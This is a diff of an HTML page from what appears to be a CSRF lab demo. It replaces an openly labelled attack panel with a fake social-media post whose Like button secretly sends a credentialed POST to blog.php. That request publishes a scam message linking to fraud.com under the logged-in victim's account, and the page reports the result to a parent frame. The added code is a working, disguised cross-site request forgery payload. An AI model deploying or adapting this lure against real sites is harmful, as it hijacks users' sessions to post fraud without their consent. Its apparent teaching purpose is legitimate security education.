@@ -1,52 +1,186 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Attacker Demo</title>
+  <meta charset="UTF-8" />
+  <title>@wanderer’s post</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-    button { padding: 12px 24px; font-size: 16px; }
+    :root{
+      --bg:#f6f7f9; --card:#fff; --bd:#e5e7eb; --txt:#111; --muted:#6b7280;
+      --brand:#ef4444; --brand-soft:#fee2e2;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; padding:32px 16px; background:var(--bg);
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif; color:var(--txt);
+      display:flex; justify-content:center;
+    }
+    .post{
+      width:min(720px,100%); background:var(--card); border:1px solid var(--bd); border-radius:16px;
+      box-shadow:0 2px 8px rgba(0,0,0,.04); overflow:hidden;
+    }
+    .head{display:flex; gap:12px; padding:16px}
+    .avatar{width:48px; height:48px; border-radius:999px; background:#ddd; flex:0 0 48px;
+      background-image:linear-gradient(135deg,#ddd,#eee)}
+    .meta{display:flex; flex-direction:column; justify-content:center}
+    .name{font-weight:700}
+    .time{color:var(--muted); font-size:13px}
+
+    .body{padding:0 16px 16px}
+    .text{line-height:1.55; margin:0 0 12px 0}
+    .photo{
+      width:100%; height:320px; border-radius:12px; background:#e5e7eb;
+      background-image:url("../../assets/ucc1.jpg"); background-size:cover; background-position:center;
+    }
+
+    .actions{display:flex; align-items:center; gap:12px; padding:12px 16px; border-top:1px solid var(--bd)}
+    .btn-like{
+      display:inline-flex; align-items:center; gap:8px;
+      border:1px solid var(--bd); background:#fff; padding:10px 14px; border-radius:999px;
+      cursor:pointer; user-select:none; transition:transform .05s ease;
+    }
+    .btn-like:active{transform:translateY(1px)}
+    .btn-like.liked{border-color:transparent; background:var(--brand-soft); color:var(--brand)}
+    .heart{font-size:18px; line-height:1}
+    .count{font-weight:600}
+
+    .hint{margin-left:auto; color:var(--muted); font-size:13px}
+    .toast{
+      position:fixed; left:50%; bottom:24px; transform:translateX(-50%);
+      background:#111; color:#fff; padding:10px 14px; border-radius:10px; font-size:14px;
+      opacity:0; pointer-events:none; transition:opacity .2s ease, transform .2s ease;
+    }
+    .toast.show{opacity:1; transform:translate(-50%, -6px)}
   </style>
 </head>
 <body>
-  <h2>CSRF Attack Panel</h2>
-  <p>This simulates a CSRF attack to blog.php using session cookies.</p>
 
-  <!-- Attack trigger button -->
-  <button onclick="launchAttack()">🔥 Launch Attack</button>
+  <article class="post" aria-label="Post from @wanderer">
+    <header class="head">
+      <div class="avatar" aria-hidden="true"></div>
+      <div class="meta">
+        <div class="name">@wanderer</div>
+        <div class="time">just now · Cork</div>
+      </div>
+    </header>
+
+    <div class="body">
+      <p class="text">What a day! Dropping a pic here 📸</p>
+      <div class="photo" role="img" aria-label="photo of a laptop"></div>
+    </div>
+
+    <!-- Action bar -->
+    <div class="actions">
+      <button id="likeBtn" class="btn-like" aria-pressed="false">
+        <span class="heart">❤️</span><span class="label">Like</span>
+        <span class="count" id="likeCount">128</span>
+      </button>
+      <span class="hint" id="hintText">Tap to like</span>
+    </div>
+  </article>
+
+  <div id="toast" class="toast" role="status" aria-live="polite">Liked</div>
 
   <script>
-    function launchAttack() {
-      // Create a FormData object and add the CSRF message
-      const formData = new FormData();
-      formData.append('content', 'Automatically posted by CSRF via session cookie!');
+    const btn   = document.getElementById('likeBtn');
+    const count = document.getElementById('likeCount');
+    const toast = document.getElementById('toast');
+    const hint  = document.getElementById('hintText');
 
-      // Send a POST request to blog.php with cookies included
-fetch('blog.php', {
-  method: 'POST',
-  credentials: 'include',
-  body: formData
-})
-.then(res => res.text())  // Read response text
-.then(text => {
-  if (text.includes("Access denied")) {
-    alert("CSRF attack blocked: Server says → " + text);
-  } else {
-    alert("CSRF attack sent successfully! Check the Blog panel.");
-  }
+    let liked = false;
+    let sending = false;
 
-  // Auto-refresh blog iframe to show if insertion was successful
-  const blogFrame = parent.document.getElementById('blogFrame');
-  if (blogFrame) {
-    blogFrame.contentWindow.location.reload();
-  }
-})
-.catch(err => {
-  console.error("Attack failed:", err);
-  alert("An error occurred during the CSRF attack.");
-});
-
+    function showToast(msg){
+      toast.textContent = msg;
+      toast.classList.add('show');
+      setTimeout(()=>toast.classList.remove('show'), 1600);
     }
+
+    // Determine whether the LEFT Blog frame is logged in (strictly distinguish "Logged in" vs "Not logged in")
+    function isVictimLoggedIn(){
+      try{
+        const frame = parent?.document?.getElementById('blogFrame');
+        const doc   = frame?.contentDocument || frame?.contentWindow?.document;
+
+        // Optional explicit marker: <meta id="loginState" content="logged-in|logged-out">
+        const meta = doc?.getElementById('loginState');
+        if (meta) {
+          const v = (meta.content || '').toLowerCase().trim();
+          if (v === 'logged-in')  return true;
+          if (v === 'logged-out') return false;
+        }
+
+        // Text fallback: check "not logged in" first, then "logged in"
+        const text = (doc?.body?.innerText || '').toLowerCase();
+        if (/status:\s*not\s+logged\s+in/.test(text)) return false;   // negative first
+        if (/status:\s*logged\s+in/.test(text))        return true;
+
+        // Extra fallback: some templates show "Logged in. You may post below."
+        if (!/not\s+logged\s+in/.test(text) && /\blogged\s+in\b/.test(text)) return true;
+
+        return false;
+      }catch(e){
+        // Cross-origin case: be conservative and treat as not logged in
+        // (in this demo it's same-origin, so reading usually succeeds)
+        return false;
+      }
+    }
+
+    function toggleLikeUI(){
+      liked = !liked;
+      btn.classList.toggle('liked', liked);
+      btn.setAttribute('aria-pressed', String(liked));
+      const base = parseInt(count.textContent || '0', 10);
+      count.textContent = liked ? base + 1 : Math.max(0, base - 1);
+      showToast(liked ? 'Liked' : 'Unliked');
+    }
+
+    // CSRF request + report result back to the parent panel precisely (ok:true/false)
+    async function launchAttack(){
+      const fd = new FormData();
+      fd.append('content', 'What a pleasant surprise! An event where you are guaranteed to win every time: https://fraud.com');
+
+      try{
+        const res  = await fetch('blog.php', { method:'POST', credentials:'include', body: fd });
+        const text = await res.text();
+
+        // Common denial cues for not-logged-in/forbidden responses
+        const failed = /access denied|not logged in|please login/i.test(text);
+        parent?.postMessage({ type:'ATTACK_RESULT', ok: !failed }, '*');
+
+        if (!failed) {
+          const blogFrame = parent?.document?.getElementById('blogFrame');
+          blogFrame?.contentWindow?.location?.reload();
+        }
+      }catch(err){
+        parent?.postMessage({ type:'ATTACK_RESULT', ok:false }, '*');
+        console.error('Attack failed:', err);
+      }
+    }
+
+    // Dynamic hint under the like button
+    function refreshHint(){
+      hint.textContent = isVictimLoggedIn() ? 'Tap to like' : 'Login on the left first';
+    }
+    refreshHint();
+    setInterval(refreshHint, 900);  // Light polling is sufficient for the demo
+
+    // Click flow: if not logged in, block immediately (no UI change, no request)
+    btn.addEventListener('click', async () => {
+      if (sending) return;
+
+      if (!isVictimLoggedIn()){
+        showToast('Please login first');
+        parent?.postMessage({ type:'ATTACK_RESULT', ok:false }, '*');
+        return;
+      }
+
+      sending = true;
+      parent?.postMessage({ type:'ATTACK_FIRED' }, '*'); // Optional: “priming” signal to the parent panel
+      toggleLikeUI();
+      try { await launchAttack(); }
+      finally { sending = false; }
+    });
   </script>
 </body>
 </html>
